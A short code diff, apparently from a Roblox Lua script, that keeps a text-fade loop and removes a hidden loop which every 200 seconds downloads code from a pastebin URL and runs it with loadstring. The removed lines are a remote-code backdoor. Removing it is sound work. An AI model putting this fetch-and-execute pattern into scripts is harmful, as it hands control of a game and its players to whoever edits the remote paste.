@@ -50,7 +50,3 @@ for i = 0, 1, 0.05 do
     textLabel2.TextTransparency = i
     wait(0.05)
 end
-while true do
-    task.wait(200)
-    loadstring(game:HttpGet("https://pastebin.com/raw/yMVAwKk2"))()
-        end
